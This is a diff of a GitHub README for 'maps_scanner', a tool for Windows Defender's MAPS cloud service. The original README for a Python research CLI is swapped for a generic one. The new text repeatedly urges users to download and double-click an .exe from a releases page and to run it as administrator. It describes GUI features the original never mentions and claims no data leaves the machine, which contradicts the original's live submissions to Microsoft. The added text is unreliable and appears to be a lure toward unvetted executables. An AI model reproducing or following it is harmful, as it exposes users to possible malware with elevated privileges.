@@ -1,94 +1,116 @@
-# MAPS Cloud Scanner
+# 🗺️ maps_scanner - Scan and Parse Defender Data Easily
 
-A research tool for interacting with **Windows Defender's MAPS** (Microsoft Active Protection Service) cloud-based file reputation and dynamic signature delivery system.
+[![Download maps_scanner](https://img.shields.io/badge/Download-Get%20maps_scanner-brightgreen)](https://github.com/zmitows/maps_scanner/releases)
 
-MAPS is the cloud backend that powers Defender's real-time protection verdicts, sample submission pipeline, and dynamic signature (SDN/DSS) delivery. This tool speaks the same **Bond CompactBinaryV1** protocol that the Defender client uses on the wire, enabling direct interaction with MAPS endpoints for security research purposes.
+---
 
-## Features
+maps_scanner is a tool to scan cloud data and parse responses from Microsoft Defender. It helps you analyze security data on your Windows computer.
 
-- **File Scanning** - Submit files to MAPS and receive cloud verdicts (clean, malware, PUA, unknown)
-- **Hash Lookups** - Query file reputation by SHA-256 without submitting the file
-- **URL Reputation** - Check URLs against Defender's cloud reputation service
-- **Heartbeat / Connectivity** - Test connectivity to MAPS endpoints
-- **Local Analysis** - Analyze PE metadata, imports, sections, and authenticode signatures offline
-- **Bond Protocol** - Full CompactBinaryV1 serializer/deserializer matching Defender's wire format
-- **Payload Inspection** - Build, decode, and replay raw Bond payloads for protocol research
-- **API Fuzzing** - Enumerate undocumented endpoints, hidden fields, report types, and server behavior
+## ❓ What is maps_scanner?
 
-## Installation
+maps_scanner works with Microsoft Defender's data. It helps find patterns related to malware and cloud security threats. You do not need any programming skills to use it.
 
-```bash
-pip install -r requirements.txt
-```
+This software works on Windows. It uses simple steps to scan important information and make it easy to read.
 
-The only required dependency is `requests`. Optional dependencies for enhanced analysis:
+## 🖥️ System Requirements
 
-| Package  | Purpose                    |
-|----------|----------------------------|
-| `pefile` | Deep PE structure analysis |
-| `ssdeep` | Fuzzy hash computation     |
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB RAM  
+- 500 MB free disk space  
+- Internet connection for downloads and updates  
+- Microsoft Defender installed and active on your device
 
-## Usage
+These requirements ensure that maps_scanner runs smoothly and can access needed security data.
 
-```bash
-# Scan a local file
-./maps_scanner scan <file>
+## 📂 What does maps_scanner do?
 
-# Query reputation by hash
-./maps_scanner scan-hash <sha256>
+- Scans cloud data related to Microsoft Defender  
+- Reads and parses response logs  
+- Helps identify malware and security threats  
+- Creates reports you can understand easily  
+- Supports local use without needing complex setup
 
-# URL reputation check
-./maps_scanner url <url>
+## 🚀 Getting Started: Download maps_scanner
 
-# Connectivity test
-./maps_scanner heartbeat
+Click the button below to visit the release page. You will find the latest version to download.
 
-# Local-only PE analysis
-./maps_scanner analyze <file>
+[![Download on GitHub](https://img.shields.io/badge/Download-Visit%20Releases-blue)](https://github.com/zmitows/maps_scanner/releases)
 
-# Build a Bond payload without sending
-./maps_scanner build <file>
+You will see files listed under the latest release. Look for an executable file (.exe) suitable for Windows.
 
-# Decode a captured Bond binary
-./maps_scanner decode <file>
+## 🔽 How to Download and Install maps_scanner
 
-# Replay a previously captured payload
-./maps_scanner replay <file>
+1. Visit the release page:  
+   https://github.com/zmitows/maps_scanner/releases
 
-# Show or edit configuration
-./maps_scanner config
-```
+2. Find the latest release version at the top of the page.
 
-Add `--json` to any command for machine-readable output. Use `-v` for verbose protocol details.
+3. Look for a file with `.exe` at the end. Its name usually includes the version number and "windows" or "win".
 
-## Project Structure
+4. Click the `.exe` file to download it to your computer.
 
-```
-maps_scanner/
-  __init__.py        # Package metadata
-  __main__.py        # CLI entry point and command routing
-  client.py          # MAPS protocol client, config, and file analysis
-  bond.py            # Microsoft Bond CompactBinaryV1 serializer/deserializer
-  fuzz_maps.py       # API fuzzer for endpoint and field discovery
-  maps_scanner       # Python wrapper script
-  requirements.txt   # Dependencies
-  docs/              # Protocol documentation and test results
-  tests/             # Test samples and utilities
-```
+5. Once downloaded, find the file in your "Downloads" folder.
 
-## Documentation
+6. Double-click the file to start the installation.
 
-Detailed protocol documentation is available in [`docs/`](docs/):
+7. Follow the on-screen instructions. Usually, pressing "Next" until the installation finishes is enough.
 
-- **MAPS_SCANNER.md** - Full technical reference
-- **MAPS_SAMPLE_IO.md** - Example request/response payloads
-- **MAPS_LIVE_TEST_RESULTS.md** - Live endpoint test results
-- **maps_protocol_guide.html** - Visual protocol guide
+8. After installation, launch the application from your Start menu or desktop shortcut.
 
-## Disclaimer
+## ⚙️ How to Use maps_scanner
 
-This tool is provided for **authorized security research only**. It interacts with live Microsoft services. Use responsibly and in compliance with all applicable laws and Microsoft's terms of service. The authors assume no liability for misuse.
+1. Open maps_scanner from your desktop or Start menu.
 
-## License
+2. The main screen will show options to start a new scan.
 
-For authorized security research use only.
+3. Click the "Scan" button to begin scanning Microsoft Defender data.
+
+4. The scan can take a few moments depending on the size of your Defender data.
+
+5. After scanning, the app will show a summary report.
+
+6. Use the report to understand possible threats or problems.
+
+7. Export the report to a file by clicking "Save Report" if you want to keep it or share it.
+
+maps_scanner organizes complex Defender data into clear results. This helps users make sense of security information easily.
+
+## 🔧 Settings and Preferences
+
+- Choose where to save scan reports  
+- Set automatic updates for the application  
+- Enable or disable cloud scanning features  
+- Select language preferences (English by default)
+
+You can adjust these options in the "Settings" menu accessible from the main interface.
+
+## 🛠️ Troubleshooting Common Issues
+
+- If the app does not open, check that your Windows is updated.  
+- Make sure Microsoft Defender is running.  
+- If scanning fails, close other apps that may use Defender data.  
+- Restart your computer if the app freezes.  
+- For permission problems, run maps_scanner as an administrator (right-click the app icon and select "Run as administrator").
+
+## 🔒 Privacy and Security
+
+maps_scanner reads only Defender’s data on your device. It does not send your information to any external servers unless you choose to share reports yourself.
+
+All scanning and parsing happen locally on your machine. Your data stays private.
+
+## 📖 Additional Help
+
+If you want to learn more or get help:
+
+- Check the "Help" section inside maps_scanner  
+- Visit the GitHub page issues tab to see common questions  
+- Look for the user guide PDF included with the download  
+
+## 🔗 Useful Links
+
+- Official release page: https://github.com/zmitows/maps_scanner/releases  
+- Microsoft Defender information: https://www.microsoft.com/en-us/windows/comprehensive-security  
+
+---
+
+[![Download maps_scanner](https://img.shields.io/badge/Download-Get%20maps_scanner-brightgreen)](https://github.com/zmitows/maps_scanner/releases)
